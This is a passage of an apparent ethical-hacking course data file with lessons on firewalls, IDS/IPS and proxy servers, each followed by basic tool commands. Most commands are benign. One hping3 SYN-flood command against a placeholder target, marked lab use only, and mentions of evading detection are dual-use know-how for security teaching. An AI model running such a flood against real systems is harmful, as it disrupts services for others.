          <p class="mb-4 text-gray-300">A firewall is a security device or software that acts as a barrier between trusted and untrusted networks. Its main job is to monitor, filter, and control incoming and outgoing network traffic based on predefined security rules.</p>
          <p class="mb-6 text-gray-300">In cybersecurity, firewalls are considered the first line of defense against unauthorized access, attacks, and malicious traffic.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What is a Firewall?</h2>
          <p class="mb-3 text-gray-300">A firewall examines network traffic and decides whether to:</p>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Allow the traffic</li>
            <li>Block the traffic</li>
            <li>Log the traffic for analysis</li>
          </ul>
          <p class="mb-6 text-gray-300">This decision is made using rules based on IP addresses, ports, protocols, and traffic behavior.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Firewalls are Important</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Prevent unauthorized access</li>
            <li>Block malicious connections</li>
            <li>Reduce attack surface</li>
            <li>Enforce network security policies</li>
          </ul>
          <p class="mb-6 text-gray-300">Without a firewall, systems are directly exposed to the internet, making them easy targets for attackers.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">How Firewalls Work (Basic Idea)</h2>
          <p class="mb-3 text-gray-300">Firewalls analyze:</p>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Source and destination IP addresses</li>
            <li>Source and destination ports</li>
            <li>Protocol type (TCP, UDP, ICMP)</li>
            <li>Connection state</li>
          </ul>
          <p class="mb-6 text-gray-300">Based on these checks, traffic is either allowed or denied.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Firewalls in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Test firewall rules</li>
            <li>Identify misconfigurations</li>
            <li>Check for rule bypass techniques</li>
            <li>Validate network security posture</li>
          </ul>
          <p class="mb-6 text-gray-300">Understanding firewall behavior is essential for realistic security testing.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Firewalls in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Protect internal networks</li>
            <li>Segment network zones</li>
            <li>Monitor suspicious traffic</li>
            <li>Enforce least-access principles</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Limitations of Firewalls</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Cannot stop phishing attacks</li>
            <li>Cannot prevent insider threats</li>
            <li>Cannot block attacks over allowed ports</li>
            <li>Cannot detect encrypted malicious payloads</li>
          </ul>
          <p class="mb-6 text-gray-300">This is why firewalls are combined with IDS, IPS, and endpoint security.</p>
        `,
        duration: '10 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Firewall Interaction',
            content: `🛠 Tool Name: iptables

Related Concept: Firewall Rules & Packet Filtering

What is iptables?
iptables is a Linux firewall utility that allows administrators to define rules for packet filtering, NAT, and traffic control.

Why This Tool Matches This Topic
Core Linux firewall tool
Controls inbound and outbound traffic
Widely used in servers and security labs
Foundation for understanding firewalls

Basic Commands
View Current Firewall Rules
sudo iptables -L

Block Incoming Traffic on Port 80
sudo iptables -A INPUT -p tcp --dport 80 -j DROP

Allow SSH Traffic
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT

Flush All Rules
sudo iptables -F`
          }
        ]
      },
      {
        title: 'Packet Filtering Firewalls',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Packet filtering firewalls are one of the most fundamental types of firewalls used to control network traffic. Unlike next-generation firewalls that inspect the content of packets or enforce application-level rules, packet filtering firewalls operate at the network layer and transport layer, making decisions solely based on packet headers. They are the first line of defense and often deployed at the perimeter of networks to filter incoming and outgoing traffic.</p>
          <p class="mb-6 text-gray-300">A packet is the basic unit of data transmitted over a network, containing both header information (like source and destination IP, ports, protocol) and payload (the actual data). Packet filtering firewalls examine only the header information to determine whether a packet should be allowed, rejected, or dropped. While simple, this method is highly effective in protecting networks from unauthorized access, port scanning, and basic attacks.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">How Packet Filtering Works</h2>
          <p class="mb-3 text-gray-300">Packet filtering firewalls use a set of rules that specify which traffic is allowed and which is denied. Each rule is applied to every packet that passes through the firewall. Decisions are typically based on:</p>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li><span class="font-semibold text-white">Source IP Address</span> – Determines where the traffic is coming from</li>
            <li><span class="font-semibold text-white">Destination IP Address</span> – Determines the target of the traffic</li>
            <li><span class="font-semibold text-white">Source Port</span> – Identifies the originating application or service</li>
            <li><span class="font-semibold text-white">Destination Port</span> – Identifies the target application or service</li>
            <li><span class="font-semibold text-white">Protocol</span> – Specifies whether the traffic is TCP, UDP, or ICMP</li>
            <li><span class="font-semibold text-white">Flags and Options</span> – Certain TCP flags like SYN, ACK, or FIN can be used to identify connection initiation or suspicious packets</li>
          </ul>
          <p class="mb-6 text-gray-300">For example, a rule may allow incoming TCP traffic on port 80 (HTTP) while blocking all other incoming traffic. Similarly, outgoing SMTP traffic (port 25) may be allowed only for internal mail servers to prevent spamming.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Advantages of Packet Filtering Firewalls</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Simple and Lightweight</li>
            <li>Effective for Basic Security</li>
            <li>Easy to Implement</li>
            <li>First Layer of Defense</li>
          </ul>
          <p class="mb-6 text-gray-300">Despite their simplicity, packet filtering firewalls are still widely used in enterprise networks because of their efficiency and reliability.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Limitations of Packet Filtering Firewalls</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>No Deep Packet Inspection</li>
            <li>Cannot Prevent Spoofing Easily</li>
            <li>Static Rules</li>
            <li>Limited Logging and Alerts</li>
            <li>Cannot Detect Complex Attacks</li>
          </ul>
          <p class="mb-6 text-gray-300">Because of these limitations, packet filtering firewalls are often used in combination with stateful inspection, proxy servers, IDS/IPS systems, and application-level firewalls.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Real-World Use Cases</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Corporate Networks – Blocking unauthorized ports like SMB or FTP</li>
            <li>Data Centers – Restricting traffic to sensitive servers from approved IPs</li>
            <li>Home Routers – Basic filtering of inbound traffic</li>
            <li>Educational Labs – Teaching rule creation fundamentals</li>
          </ul>
          <p class="mb-6 text-gray-300">Understanding how packet filtering works provides a strong foundation for more advanced firewall concepts like stateful inspection and next-generation firewalls.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Packet Filtering in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Identify allowed vs blocked ports</li>
            <li>Test rules for misconfigurations</li>
            <li>Understand access patterns</li>
            <li>Plan testing without triggering alarms</li>
          </ul>
          <p class="mb-6 text-gray-300">For instance, an ethical hacker may test if port 22 (SSH) is blocked externally but allowed internally, indicating potential lateral movement paths.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Packet Filtering in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Limit attack surface to essential traffic</li>
            <li>Enforce least privilege across segments</li>
            <li>Reduce unauthorized access attempts</li>
            <li>Monitor logs for suspicious patterns</li>
            <li>Integrate with layered controls</li>
          </ul>
          <p class="mb-6 text-gray-300">Properly implemented packet filtering forms the backbone of network security policies.</p>
        `,
        duration: '15 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Packet Filtering',
            content: `🛠 Tool Name: iptables

Related Concept: Packet Filtering & Traffic Control

What is iptables?
iptables is a Linux utility for configuring the built-in firewall. It allows administrators to create complex rules for packet filtering, NAT, and traffic control.

Why This Tool Matches This Topic
Provides direct control over packet filtering rules
Widely used in Linux servers and labs
Essential for learning firewall behavior and rule configuration
Supports both inbound and outbound filtering

Basic Commands
View All Rules
sudo iptables -L -v

Allow Incoming HTTP Traffic
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT

Block All Incoming Traffic
sudo iptables -P INPUT DROP

Delete a Specific Rule
sudo iptables -D INPUT 1

Save Rules to Persist
sudo iptables-save > /etc/iptables/rules.v4`
          }
        ]
      },
      {
        title: 'Stateful & Stateless Firewalls',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Firewalls are critical for controlling network traffic, but not all firewalls function the same way. Understanding the difference between stateful and stateless firewalls is essential for anyone learning cybersecurity. Both types filter traffic, yet the way they process packets, track connections, and enforce security policies differs significantly.</p>
          <p class="mb-6 text-gray-300">This knowledge is fundamental because most real-world networks implement a combination of firewall types, and ethical hackers and defenders need to understand how traffic flows through them.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What is a Stateless Firewall?</h2>
          <p class="mb-3 text-gray-300">A stateless firewall, also known as a packet-filtering firewall, examines individual packets in isolation. It does not retain memory of previous packets or connection states. Each packet is evaluated solely based on firewall rules, typically considering:</p>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Source and destination IP address</li>
            <li>Source and destination port</li>
            <li>Protocol (TCP, UDP, ICMP)</li>
          </ul>
          <h3 class="text-lg font-semibold mb-2 text-white">Key Characteristics</h3>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>No knowledge of connection state</li>
            <li>Decisions made per packet</li>
            <li>Very fast and lightweight</li>
            <li>Simple to configure</li>
          </ul>
          <p class="mb-3 text-gray-300"><span class="font-semibold text-white">Example Use Case:</span> Blocking all traffic to port 23 (Telnet) regardless of whether the connection is established or new.</p>
          <h3 class="text-lg font-semibold mb-2 text-white">Limitations</h3>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Cannot detect anomalies in packet sequences</li>
            <li>Cannot prevent attacks that rely on session manipulation</li>
            <li>Provides no insight into connection integrity</li>
          </ul>
          <p class="mb-6 text-gray-300">Despite limitations, stateless firewalls are effective for basic access control, especially in small networks or as a first layer in a multi-layered security setup.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What is a Stateful Firewall?</h2>
          <p class="mb-3 text-gray-300">A stateful firewall monitors the state of active connections. It maintains a state table that tracks sessions passing through the firewall, including TCP handshakes and UDP flows.</p>
          <h3 class="text-lg font-semibold mb-2 text-white">Key Characteristics</h3>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Tracks connection states (SYN, ACK, FIN, RST)</li>
            <li>Makes decisions based on context, not just individual packets</li>
            <li>Dynamically allows return traffic for established sessions</li>
            <li>Provides better security against spoofed or malicious packets</li>
          </ul>
          <p class="mb-3 text-gray-300"><span class="font-semibold text-white">Example Use Case:</span> Allow a client inside the network to connect to an external web server on port 80 and automatically permit the returning traffic, while still blocking unrelated inbound traffic.</p>
          <h3 class="text-lg font-semibold mb-2 text-white">Advantages</h3>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Detects unauthorized attempts to initiate connections</li>
            <li>Reduces risk of session hijacking and replay attacks</li>
            <li>Provides richer logging and monitoring</li>
          </ul>
          <h3 class="text-lg font-semibold mb-2 text-white">Limitations</h3>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>More resource-intensive than stateless firewalls</li>
            <li>Complex to configure for very large networks</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Stateful vs Stateless — Side by Side</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li><span class="font-semibold text-white">Packet Evaluation:</span> Stateless evaluates each packet individually; Stateful considers packet in the context of a connection</li>
            <li><span class="font-semibold text-white">Memory of Connections:</span> Stateless — no; Stateful — yes</li>
            <li><span class="font-semibold text-white">Complexity:</span> Stateless — simple; Stateful — more complex</li>
            <li><span class="font-semibold text-white">Performance:</span> Stateless — very fast; Stateful — slightly slower due to state tracking</li>
            <li><span class="font-semibold text-white">Security:</span> Stateless — basic; Stateful — advanced</li>
            <li><span class="font-semibold text-white">Use Case:</span> Stateless — basic access control; Stateful — corporate networks and dynamic traffic</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Importance in Cybersecurity</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Designing secure network architectures</li>
            <li>Conducting penetration tests and avoiding detection</li>
            <li>Implementing layered security strategies (defense-in-depth)</li>
            <li>Auditing firewall effectiveness</li>
          </ul>
          <p class="mb-6 text-gray-300">Attackers often test stateful firewalls for misconfigurations, as state tracking introduces complexity that can be exploited.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Stateful & Stateless in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Identify open ports and allowed traffic</li>
            <li>Test whether return traffic is properly tracked</li>
            <li>Determine firewall behavior against crafted packets</li>
            <li>Plan realistic attack vectors without triggering alerts</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Stateful & Stateless in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Choose appropriate firewall types for different network segments</li>
            <li>Implement layered defenses combining stateful and stateless firewalls</li>
            <li>Monitor for anomalous traffic and potential bypass attempts</li>
            <li>Enhance visibility into network behavior</li>
          </ul>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Firewall Testing',
            content: `🛠 Tool Name: hping3

Related Concept: Testing Stateful and Stateless Firewalls

What is hping3?
hping3 is a versatile network tool that can generate custom TCP, UDP, and ICMP packets. Security professionals use it to test how firewalls handle different packet types and states.

Why This Tool Matches This Topic
Simulates various traffic patterns
Tests firewall rule enforcement
Allows crafted packet experiments for stateful/stateless behavior
Useful in penetration testing labs

Basic Commands
Test TCP SYN to Port 80
sudo hping3 -S target_ip -p 80

Send UDP Packet to Port 53
sudo hping3 --udp target_ip -p 53

Test Firewall Response with FIN Packet
sudo hping3 -F target_ip -p 80

Flood with TCP Packets (Lab Use Only)
sudo hping3 -S --flood target_ip -p 80`
          }
        ]
      },
      {
        title: 'Application-Level Firewalls',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">Application-level firewalls, also known as proxy firewalls or layer 7 firewalls, operate at the application layer of the OSI model. Unlike packet-filtering or stateful firewalls that focus on IP addresses, ports, and protocols, application-level firewalls inspect the actual content of the data being transmitted — including HTTP, FTP, DNS, and other application-specific protocols.</p>
          <p class="mb-6 text-gray-300">These firewalls understand application behavior, providing higher security and granular control. They are widely used to protect web servers, APIs, email servers, and other critical applications from sophisticated attacks.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">How Application-Level Firewalls Work</h2>
          <p class="mb-3 text-gray-300">Application firewalls act as an intermediary (proxy) between the client and the server. When a request comes in, the firewall:</p>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Examines application data (headers, payload, commands)</li>
            <li>Compares it against a set of rules or policies</li>
            <li>Allows, blocks, or modifies the traffic based on evaluation</li>
            <li>Logs suspicious or malicious activity for monitoring</li>
          </ul>
          <p class="mb-6 text-gray-300">For example, in a Web Application Firewall (WAF), HTTP requests are inspected to prevent SQL injection, cross-site scripting (XSS), or command injection attacks.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Key Features</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li><span class="font-semibold text-white">Protocol Awareness:</span> Understands HTTP, HTTPS, FTP, SMTP, DNS</li>
            <li><span class="font-semibold text-white">Deep Packet Inspection (DPI):</span> Examines payload to identify malicious content</li>
            <li><span class="font-semibold text-white">Content Filtering:</span> Blocks traffic based on patterns, keywords, or signatures</li>
            <li><span class="font-semibold text-white">Access Control:</span> Enforces rules on authentication, sessions, uploads</li>
            <li><span class="font-semibold text-white">Logging & Reporting:</span> Detailed logs for analysis and forensics</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Advantages</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Protects against application-layer attacks (SQLi, XSS, etc.)</li>
            <li>Granular control over traffic and users</li>
            <li>Ability to block malicious content in real time</li>
            <li>Can work in proxy mode to hide backend server details</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Limitations</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Higher resource consumption compared to network-layer firewalls</li>
            <li>Complexity in rule configuration</li>
            <li>May introduce latency due to content inspection</li>
            <li>Requires continuous updates to rule sets for new vulnerabilities</li>
          </ul>
          <p class="mb-6 text-gray-300">Despite these limitations, application-level firewalls are essential for modern web and API security, especially in enterprises and cloud environments.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Application-Level Firewalls in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Test for misconfigurations</li>
            <li>Identify potential bypass techniques</li>
            <li>Simulate real-world attacks (SQL injection, XSS)</li>
            <li>Understand how application data is filtered</li>
          </ul>
          <p class="mb-6 text-gray-300">For instance, a penetration tester may send malicious HTTP requests to see if the firewall blocks SQL injection attempts.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Application-Level Firewalls in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Protect sensitive web applications and APIs</li>
            <li>Block malicious payloads and unauthorized commands</li>
            <li>Monitor for suspicious traffic patterns</li>
            <li>Strengthen enterprise and cloud application security</li>
          </ul>
          <p class="mb-6 text-gray-300">Application firewalls often complement stateful and packet-filtering firewalls as part of a layered security architecture.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Real-World Use Cases</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Web Application Protection — WAFs like ModSecurity or AWS WAF</li>
            <li>Email Security — Filter SMTP for spam, phishing, malware</li>
            <li>API Security — Inspect and block malicious API payloads</li>
            <li>Cloud Security — Protect cloud-hosted applications from exploitation</li>
          </ul>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Application Firewall Testing',
            content: `🛠 Tool Name: OWASP ZAP (Zed Attack Proxy)

Related Concept: Application-Layer Firewall Testing

What is OWASP ZAP?
OWASP ZAP is an open-source web application security testing tool that allows professionals to intercept, modify, and analyze HTTP/HTTPS traffic. It is widely used to test application-level firewalls and web applications for vulnerabilities.

Why This Tool Matches This Topic
Simulates attacks blocked by application-level firewalls
Performs automated scanning for common web vulnerabilities
Supports intercepting requests to analyze firewall behavior
Essential for ethical hacking labs and web security testing

Basic Commands / Usage
Start ZAP Proxy
zap.sh

Intercept Traffic
Configure browser proxy to 127.0.0.1:8080
Capture and inspect HTTP/HTTPS requests

Active Scan for Vulnerabilities
Select target URL
Run Active Scan to test for XSS, SQLi, and other attacks

Automated Spidering
Crawl the application to identify endpoints
Use results to test firewall behavior`
          }
        ]
      },
      {
        title: 'IDS vs IPS',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">As networks grow larger and more complex, traditional firewalls alone are no longer sufficient to detect advanced cyber threats. Intrusion Detection Systems (IDS) and Intrusion Prevention Systems (IPS) play a crucial role in monitoring traffic and activity to identify malicious behavior, policy violations, and potential attacks.</p>
          <p class="mb-6 text-gray-300">Although IDS and IPS sound similar and are often mentioned together, they serve different purposes in a cybersecurity architecture. Understanding their differences is essential for building strong defensive systems.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What is an Intrusion Detection System (IDS)?</h2>
          <p class="mb-3 text-gray-300">An IDS is a monitoring system that analyzes network traffic or system activity to detect suspicious behavior. It does not actively block traffic; instead, it generates alerts when potential threats are detected.</p>
          <h3 class="text-lg font-semibold mb-2 text-white">How IDS Works</h3>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Inspects packets and traffic patterns</li>
            <li>Compares activity against known attack signatures</li>
            <li>Identifies abnormal behavior using anomaly detection</li>
            <li>Logs and alerts administrators about threats</li>
          </ul>
          <p class="mb-6 text-gray-300"><span class="font-semibold text-white">Key Point:</span> IDS is a passive security control.</p>

          <h3 class="text-lg font-semibold mb-2 text-white">Types of IDS</h3>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li><span class="font-semibold text-white">Network-Based IDS (NIDS):</span> Monitors network traffic across the environment</li>
            <li><span class="font-semibold text-white">Host-Based IDS (HIDS):</span> Runs on individual systems to monitor logs, file changes, and processes</li>
          </ul>
          <p class="mb-6 text-gray-300">Both types help detect attacks such as port scanning, brute-force attempts, and malware communication.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">What is an Intrusion Prevention System (IPS)?</h2>
          <p class="mb-3 text-gray-300">An IPS is an active security system that not only detects malicious traffic but also blocks or prevents it in real time. IPS is typically deployed inline, so all traffic passes through it.</p>
          <h3 class="text-lg font-semibold mb-2 text-white">How IPS Works</h3>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Inspects packets deeply</li>
            <li>Matches traffic against signatures and rules</li>
            <li>Automatically drops malicious packets</li>
            <li>Blocks IP addresses or terminates sessions</li>
          </ul>
          <p class="mb-6 text-gray-300"><span class="font-semibold text-white">Key Point:</span> IPS is a preventive security control.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Detection Methods Used by IDS and IPS</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li><span class="font-semibold text-white">Signature-Based Detection:</span> Matches known attack patterns</li>
            <li><span class="font-semibold text-white">Anomaly-Based Detection:</span> Detects deviations from normal behavior</li>
            <li><span class="font-semibold text-white">Policy-Based Detection:</span> Identifies violations of security rules</li>
          </ul>
          <p class="mb-6 text-gray-300">Modern systems often combine multiple techniques for better accuracy.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">IDS vs IPS — Key Differences</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li><span class="font-semibold text-white">Mode:</span> IDS — passive; IPS — active</li>
            <li><span class="font-semibold text-white">Traffic Blocking:</span> IDS — no; IPS — yes</li>
            <li><span class="font-semibold text-white">Placement:</span> IDS — out-of-band; IPS — inline</li>
            <li><span class="font-semibold text-white">Response:</span> IDS — alerts; IPS — automatic blocking</li>
            <li><span class="font-semibold text-white">Risk:</span> IDS — no service disruption; IPS — false positives may block good traffic</li>
            <li><span class="font-semibold text-white">Use Case:</span> IDS — monitoring and alerting; IPS — real-time prevention</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Why IDS and IPS are Important</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Detect ongoing attacks</li>
            <li>Reduce response time</li>
            <li>Prevent known exploits</li>
            <li>Gain visibility into network activity</li>
            <li>Support compliance and audits</li>
          </ul>
          <p class="mb-6 text-gray-300">Without IDS/IPS, many attacks remain unnoticed until serious damage occurs.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">IDS/IPS in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Understand detection mechanisms</li>
            <li>Test alert generation</li>
            <li>Identify evasion techniques</li>
            <li>Improve defensive strategies</li>
          </ul>
          <p class="mb-6 text-gray-300">Testing IDS/IPS helps organizations fine-tune rules and reduce false positives.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">IDS/IPS in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Monitor threats continuously</li>
            <li>Automatically block malicious traffic</li>
            <li>Generate logs for incident response</li>
            <li>Strengthen layered security architectures</li>
          </ul>
          <p class="mb-6 text-gray-300">IDS/IPS often work alongside firewalls, SIEM systems, and endpoint security.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Real-World Use Cases</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Detecting malware command-and-control traffic</li>
            <li>Preventing SQL injection and exploit attempts</li>
            <li>Monitoring insider threats</li>
            <li>Blocking brute-force login attacks</li>
          </ul>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – IDS/IPS Testing',
            content: `🛠 Tool Name: Snort

Related Concept: Intrusion Detection and Prevention

What is Snort?
Snort is a widely used open-source IDS/IPS engine capable of real-time traffic analysis and packet logging.

Why This Tool Matches This Topic
Works as IDS or IPS
Uses signature-based detection
Industry-standard learning tool
Strong community support

Basic Commands
Run Snort in IDS Mode
snort -A console -q -c /etc/snort/snort.conf -i eth0

Test Snort Configuration
snort -T -c /etc/snort/snort.conf

Run Snort in IPS Mode
snort -Q --daq afpacket -c /etc/snort/snort.conf -i eth0`
          }
        ]
      },
      {
        title: 'Proxy Servers',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">Introduction</h2>
          <p class="mb-4 text-gray-300">A proxy server acts as an intermediary between clients and servers, handling requests on behalf of clients. It is widely used in cybersecurity for security, privacy, caching, and traffic control. By directing client requests through a proxy, organizations can filter content, hide internal IP addresses, and monitor network activity.</p>
          <p class="mb-6 text-gray-300">Proxies operate at various levels of the OSI model, including application and network layers, allowing flexible control over internet access and internal resource usage.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">How Proxy Servers Work</h2>
          <p class="mb-3 text-gray-300">When a client requests access to a website or service, the proxy server:</p>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Receives the request from the client</li>
            <li>Evaluates it based on configured rules (e.g., block certain sites)</li>
            <li>Forwards the request to the target server if allowed</li>
            <li>Receives the response from the server</li>
            <li>Sends the response back to the client</li>
          </ul>
          <p class="mb-6 text-gray-300">This process hides the client’s IP address from external servers, improving privacy and security.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Types of Proxy Servers</h2>
          <h3 class="text-lg font-semibold mb-2 text-white">Forward Proxy</h3>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Sits between internal clients and the internet</li>
            <li>Filters outgoing traffic and hides client IP</li>
            <li>Example: Corporate networks blocking access to unauthorized sites</li>
          </ul>
          <h3 class="text-lg font-semibold mb-2 text-white">Reverse Proxy</h3>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Sits between external clients and internal servers</li>
            <li>Protects web servers by filtering traffic and distributing load</li>
            <li>Example: Load balancers and WAFs protecting web applications</li>
          </ul>
          <h3 class="text-lg font-semibold mb-2 text-white">Transparent Proxy</h3>
          <ul class="list-disc pl-6 mb-4 text-gray-300 space-y-1">
            <li>Intercepts client traffic without configuration</li>
            <li>Often used for caching or content filtering</li>
          </ul>
          <h3 class="text-lg font-semibold mb-2 text-white">Anonymous / High-Anonymity Proxies</h3>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Hide client IP to protect user identity online</li>
            <li>High-anonymity proxies prevent servers from detecting proxy usage</li>
          </ul>

          <h2 class="text-xl font-semibold mb-3 text-white">Why Proxy Servers are Important</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Enhance security — block malicious sites and traffic</li>
            <li>Improve privacy — hide internal IP addresses</li>
            <li>Monitor usage — track access to sites and services</li>
            <li>Control bandwidth — cache frequently accessed content</li>
            <li>Implement content filtering — block inappropriate or unauthorized websites</li>
          </ul>
          <p class="mb-6 text-gray-300">Proxies are widely used in ethical hacking labs to anonymize traffic and test defenses without revealing the tester’s identity.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Proxy Servers in Ethical Hacking</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Intercept and analyze web requests</li>
            <li>Test firewall and content filtering rules</li>
            <li>Perform vulnerability scanning while masking IP</li>
            <li>Debug and manipulate HTTP/HTTPS traffic</li>
          </ul>
          <p class="mb-6 text-gray-300">Popular tools like Burp Suite act as application-level proxies for testing web applications.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Proxy Servers in Defensive Security</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Control web traffic in corporate networks</li>
            <li>Monitor employee activity and enforce policies</li>
            <li>Prevent access to malicious websites</li>
            <li>Implement caching for performance optimization</li>
            <li>Filter traffic at granular levels (URL, content types)</li>
          </ul>
          <p class="mb-6 text-gray-300">Proxies complement firewalls, IDS/IPS, and other systems in a layered defense strategy.</p>

          <h2 class="text-xl font-semibold mb-3 text-white">Real-World Use Cases</h2>
          <ul class="list-disc pl-6 mb-6 text-gray-300 space-y-1">
            <li>Corporate networks using forward proxies to enforce acceptable use policies</li>
            <li>Reverse proxies protecting e-commerce sites from direct attacks</li>
            <li>Transparent proxies providing caching for ISPs and schools</li>
            <li>High-anonymity proxies allowing red-team research without exposing IP</li>
          </ul>
        `,
        duration: '20 min',
        syntax: [
          {
            title: 'Kali Linux Tool – Proxy Server',
            content: `🛠 Tool Name: Burp Suite

Related Concept: Proxy Server for Security Testing

What is Burp Suite?
Burp Suite is a powerful application used in web security testing. Its proxy feature allows testers to intercept, inspect, and modify HTTP/HTTPS traffic between a client and a server.

Why This Tool Matches This Topic
Provides an interactive proxy for web traffic
Supports security testing and vulnerability assessment
Widely used in penetration testing labs
Helps learners understand real-world proxy usage

Basic Commands / Usage
Start Burp Suite
burpsuite

Configure Browser Proxy
Set browser proxy to 127.0.0.1:8080
Intercept traffic through Burp Suite

Intercept HTTP/HTTPS Requests
Enable Intercept in the Proxy tab
Modify or forward requests to the server

Use Repeater for Manual Testing
Send intercepted requests to Repeater
Modify parameters and analyze responses`
          }
        ]
      },
      {
        title: 'NAT & Port Forwarding Basics',
        content: `
